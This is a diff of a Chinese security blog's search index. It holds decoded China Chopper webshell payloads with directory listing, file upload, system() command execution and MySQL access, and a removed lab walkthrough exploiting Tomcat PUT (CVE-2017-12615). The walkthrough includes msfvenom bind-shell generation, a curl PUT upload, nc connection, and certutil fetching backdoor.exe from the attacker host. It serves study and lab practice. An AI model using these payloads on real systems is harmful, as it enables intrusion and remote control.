+<span class="token variable">$D</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$F</span> <span class="token operator">=</span> @<span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$F</span> <span class="token operator">==</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span>"<span class="token constant">ERROR</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">// Path Not Found Or No Permission!");</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
+    <span class="token variable">$M</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
+    <span class="token variable">$L</span> <span class="token operator">=</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">//    对目录进行循环扫描</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$N</span> <span class="token operator">=</span> @<span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token comment" spellcheck="true">//    获取目录中文件</span>
+        <span class="token variable">$P</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$N</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//    获取文件时间</span>
+        <span class="token variable">$T</span> <span class="token operator">=</span> @<span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Y-m-d H:i:s"</span><span class="token punctuation">,</span> @<span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//    获取文件权限</span>
+        @<span class="token variable">$E</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span>@<span class="token function">fileperms</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//    获取文件大小</span>
+        <span class="token variable">$R</span> <span class="token operator">=</span> <span class="token string">"\t"</span><span class="token punctuation">.</span><span class="token variable">$T</span><span class="token punctuation">.</span><span class="token string">"\t"</span><span class="token punctuation">.</span>@<span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\t"</span><span class="token punctuation">.</span><span class="token variable">$E</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$P</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token variable">$M</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$N</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$R</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+            <span class="token variable">$L</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$N</span><span class="token punctuation">.</span><span class="token variable">$R</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$M</span><span class="token punctuation">.</span><span class="token variable">$L</span><span class="token punctuation">;</span>
+    @<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$F</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"|&lt;-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment"># 获取了路径参数之后，代码将指定路径的句柄打开，对目录进行循环扫描，获取目录中的文件以及文件的权限，大小，时间，日期这四个参数，使用\t制表符拼在一起捆绑发送回客户端，客户端对参数进行处理，并将获取的参数形成显示的界面</span>
+
+<span class="token shell-comment comment"># z1 url+base64解码（查询的路径）</span>
+C<span class="token punctuation">:</span>\<span class="token package"><span class="token punctuation">\</span></span>
+</code></pre>
+<p><strong>payload中大致函数解析如下：</strong></p>
+<blockquote>
+<p><code>opendir() 函数：</code>打开一个目录句柄，可由<code>closedir()</code>，<code>readdir() </code>和<code>rewinddir()</code>使用。若成功，则该函数返回一个目录流，否则返回 false 以及一个 error。可以通过在函数名前加上<code>@</code>来隐藏 错误输出。</p>
+<p> <code>readdir() 函数：</code>返回由<code>opendir()</code>打开的目录句柄中的条目。若成功，则该函数返回一个文件名，否则返回 false。</p>
+<p><code>fileperms() 函数：</code>返回文件或目录的权限。若成功，则返回文件的访问权限。若失败，则返回 false。</p>
+<p><code>base_convert() 函数：</code>在任意进制之间转换数字。</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">base_convert</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span>frombase<span class="token punctuation">,</span>tobase<span class="token punctuation">)</span>
+</code></pre>
+<p><code>filesize() 函数：</code>返回指定文件的大小。若成功，则返回文件大小的字节数。若失败，则返回 false 并生成一条 E_WARNING 级的错误。</p>
+<p><code>filemtime() 函数：</code>返回文件内容的上次修改时间。如果成功，该函数将以 Unix 时间戳形式返回文件内容的上次修改时间。如果失败，则返回 FALSE。</p>
+<p><code>closedir() 函数：</code>关闭目录句柄。</p>
+</blockquote>
+<h4 id="文件上传功能"><a href="#文件上传功能" class="headerlink" title="文件上传功能"></a>文件上传功能</h4><p>通常用来上传高权限的大型木马，用来建立更稳固功能更多的连接。</p>
+<blockquote>
+<p>为了方便，这里上传一个<code>test.txt</code>作为实验对象。</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508104359116.png" alt="image-20210508104359116"></p>
+<blockquote>
+<p>有三个参数</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508104629676.png" alt="image-20210508104629676"></p>
+<blockquote>
+<p>解码后</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># z0</span>
+@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_magic_quotes_runtime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"->|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z2"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$buf</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+     <span class="token variable">$buf</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">"%"</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span>@<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">"1"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"|&lt;-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token shell-comment comment"># 将文件创建并将内容写入，然后菜刀会再次发送时数据包对目录进行请求，刷新目录列表，与上面请求目录的代码一样</span>
+
+<span class="token shell-comment comment"># z1 base64解码（上传路径）</span>
+C<span class="token punctuation">:</span>\<span class="token package"><span class="token punctuation">\</span>test</span><span class="token punctuation">.</span>txt
+
+<span class="token shell-comment comment"># z2 16进制转字符串（上传文件内容）</span>
+hello word
+</code></pre>
+<p>关键函数：</p>
+<blockquote>
+<p><code>fwrite() 函数：</code>将内容写入一个打开的文件中。函数会在到达指定长度或读到文件末尾（EOF）时（以先到者为准），停止运行。如果函数成功执行，则返回写入的字节数。如果失败，则返回 FALSE。</p>
+</blockquote>
+<h4 id="命令执行功能"><a href="#命令执行功能" class="headerlink" title="命令执行功能"></a>命令执行功能</h4><p>菜刀的远程终端模拟功能，即<code>cmd</code></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508105642381.png" alt="image-20210508105642381"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508105655347.png" alt="image-20210508105655347"></p>
+<blockquote>
+<p>有三个参数</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508105738403.png" alt="image-20210508105738403"></p>
+<blockquote>
+<p>解码后</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># z0</span>
+@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_magic_quotes_runtime</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"->|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
+<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// dirname() 函数返回路径中的目录部分。</span>
+<span class="token comment" spellcheck="true">// $_SERVER["SCRIPT_FILENAME"]：当前执行脚本的绝对路径。</span>
+<span class="token comment" spellcheck="true">// 如果在命令行界面使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER['SCRIPT_FILENAME'] 将包含用户指定的相对路径。</span>
+<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// substr() 函数返回字符串的一部分。</span>
+<span class="token comment" spellcheck="true">// 用捕获分组获得字符串中的参数，用来对要执行的命令进行匹配</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"/"</span> <span class="token operator">?</span> <span class="token string">"-c \"&amp;#123;$s&amp;#125;\""</span> <span class="token punctuation">:</span> <span class="token string">"/c \"&amp;#123;$s&amp;#125;\""</span><span class="token punctuation">;</span>
+<span class="token variable">$r</span> <span class="token operator">=</span> <span class="token string">"&amp;#123;$p&amp;#125; &amp;#123;$c&amp;#125;"</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 执行系统命令，并屏蔽错误显示。</span>
+@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">.</span><span class="token string">" 2>&amp;1"</span><span class="token punctuation">,</span> <span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$ret</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"ret = &amp;#123;$ret&amp;#125;"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"|&lt;-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token shell-comment comment"># z1</span>
+cmd
+    
+<span class="token shell-comment comment"># z2 （执行的命令）</span>
+cd <span class="token operator">/</span>d "C<span class="token punctuation">:</span>\<span class="token package">AppServ<span class="token punctuation">\</span>www<span class="token punctuation">\</span></span>"<span class="token operator">&amp;</span>ipconfig<span class="token operator">&amp;</span><span class="token keyword">echo</span> <span class="token punctuation">[</span>S<span class="token punctuation">]</span><span class="token operator">&amp;</span>cd<span class="token operator">&amp;</span><span class="token keyword">echo</span> <span class="token punctuation">[</span>E<span class="token punctuation">]</span>
+</code></pre>
+<h4 id="数据库模拟功能"><a href="#数据库模拟功能" class="headerlink" title="数据库模拟功能"></a>数据库模拟功能</h4><blockquote>
+<p>菜刀的数据库配置</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210508112550996.png" alt="image-20210508112550996"></p>
+<blockquote>
+<p>数据解码</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php">@<span class="token function">ini_set</span> <span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">set_magic_quotes_runtime</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"->|"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.O 起将始终返回 FALSE。</span>
+<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">//  stripslashes() 删除反斜杠</span>
+<span class="token variable">$conf</span> <span class="token operator">=</span> <span class="token variable">$m</span> <span class="token operator">?</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z1"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// explode() 将字符串打散为数组</span>
+<span class="token variable">$ar</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"choraheiheihei"</span><span class="token punctuation">,</span> <span class="token variable">$conf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dbn</span> <span class="token operator">=</span> <span class="token variable">$m</span> <span class="token operator">?</span> <span class="token function">stripslashes</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z2"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"z3"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$T</span> <span class="token operator">=</span> @<span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$ar</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$ar</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$ar</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+@<span class="token function">mysql_query</span> <span class="token punctuation">(</span><span class="token string">"SET NAMES utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dbn</span> <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SHOW DATABASES"</span><span class="token punctuation">;</span>
+    <span class="token variable">$q</span> <span class="token operator">=</span> @<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token comment" spellcheck="true">// mysql_fetch_row() 函数从结果集中取得一行作为数字数组。</span>
+    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$rs</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$rs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\t|\t\r\n"</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    @<span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"|&lt;-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+    @<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$dbn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$q</span> <span class="token operator">=</span> @<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">$col</span> <span class="token operator">=</span> @<span class="token function">mysql_field_name</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$col</span> <span class="token punctuation">.</span> <span class="token string">"\t|\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$i</span> <span class="token operator">++</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">$rs</span> <span class="token operator">=</span> @<span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$c</span> <span class="token operator">&lt;</span> <span class="token variable">$i</span><span class="token punctuation">;</span> <span class="token variable">$c</span> <span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$rs</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"\t|\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    @<span class="token function">mysql_close</span><span class="token punctuation">(</span><span class="token variable">$T</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"|&lt;-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token shell-comment comment"># 代码的主要功能是与目标服务器的数据库简历连接（具体），获取数据库的库，表，列字段等内容，并将我们对数据库的操作传递过去，并将执行结果传递回来。在菜刀里直接点击对应的数据库内容，菜刀会直接生成对应的语句，对数据库进行操作</span>
+</code></pre>
+]]></content>
   </entry>
   <entry>
     <title>PHP代码审计基础概念</title>
@@ -555,102 +909,6 @@ disable_functions<span class="token operator">=</span>phpinfo<span class="token 
       <tags>
         <tag>PHP</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一次windows渗透测试</title>
-    <url>/2021/05/06/%E4%B8%80%E6%AC%A1Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h1 id="windows内核提权实战"><a href="#windows内核提权实战" class="headerlink" title="windows内核提权实战"></a>windows内核提权实战</h1><p>kali IP:  172.16.10.111</p>
-<p>靶机IP: 172.16.10.180</p>
-<blockquote>
-<p>2021-05-06自搭环境，漏洞为Tomcat PUT （cve-2017-12615）</p>
-<p>msf使用<code>tomcat_jsp_upload_bypass</code>模块</p>
-</blockquote>
-<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="对Web应用漏洞扫描探测"><a href="#对Web应用漏洞扫描探测" class="headerlink" title="对Web应用漏洞扫描探测"></a>对Web应用漏洞扫描探测</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212208824.png" alt="image-20210506212208824"></p>
-<blockquote>
-<p>发现服务的HTTP method方法中允许PUT，DELETE，允许客户端保存文件至服务器上</p>
-</blockquote>
-<h3 id="生成jsp反弹木马"><a href="#生成jsp反弹木马" class="headerlink" title="生成jsp反弹木马"></a>生成jsp反弹木马</h3><pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
-└─# msfconsole 
-msf6 > use payload/windows/shell_bind_tcp
-msf6 payload(windows/shell_bind_tcp) > set lport 4449
-msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp
-[*] Writing 149075 bytes to shell.jsp...
-</code></pre>
-<h3 id="上传jsp木马"><a href="#上传jsp木马" class="headerlink" title="上传jsp木马"></a>上传jsp木马</h3><blockquote>
-<p>使用curl，通过PUT方式上传<code>/test.jsp/</code>文件</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212432604.png" alt="image-20210506212432604"></p>
-<h3 id="访问Web木马"><a href="#访问Web木马" class="headerlink" title="访问Web木马"></a>访问Web木马</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213004651.png" alt="image-20210506213004651"></p>
-<h3 id="使用nc连接"><a href="#使用nc连接" class="headerlink" title="使用nc连接"></a>使用nc连接</h3><pre class=" language-shell"><code class="language-shell">nc 172.16.10.180 4449
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213049337.png" alt="image-20210506213049337"></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
-<p>在C盘下创建back目录</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">chcp 437        //将编码改为英文，不会出现乱码
-cd c:\
-mkdir back
-cd c:\back
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213421968.png" alt="image-20210506213421968"></p>
-<blockquote>
-<p>上传backdoor.exe后门</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
-└─# msfpc windows 172.16.10.111
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213546472.png" alt="image-20210506213546472"></p>
-<blockquote>
-<p>python快速开启http服务</p>
-</blockquote>
-<pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8180</span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213906822.png" alt="image-20210506213906822"></p>
-<blockquote>
-<p>靶机远程下载<code>backdoor.exe</code></p>
-</blockquote>
-<pre class=" language-cmd"><code class="language-cmd">certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214012023.png" alt="image-20210506214012023"></p>
-<blockquote>
-<p>kali开启监听</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">──(root💀kali)-[/home/sheng]
-└─# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214303446.png" alt="image-20210506214303446"></p>
-<blockquote>
